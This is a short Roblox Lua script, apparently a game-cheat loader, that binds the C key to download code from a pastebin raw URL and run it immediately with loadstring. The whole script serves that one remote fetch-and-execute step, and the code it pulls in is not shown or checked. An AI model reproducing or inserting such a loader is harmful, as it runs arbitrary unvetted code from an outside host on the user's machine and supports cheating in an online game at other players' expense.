repeat task.wait() until game:IsLoaded()
local UserInputService = game:GetService("UserInputService")

local function onInputBegan(input, _gameProcessed)
	if input.KeyCode == Enum.KeyCode.C then -- Change "C" to keybind you want
    loadstring(game:HttpGet("https://pastebin.com/raw/vXi8B57y"))()
	end
end

UserInputService.InputBegan:Connect(onInputBegan)
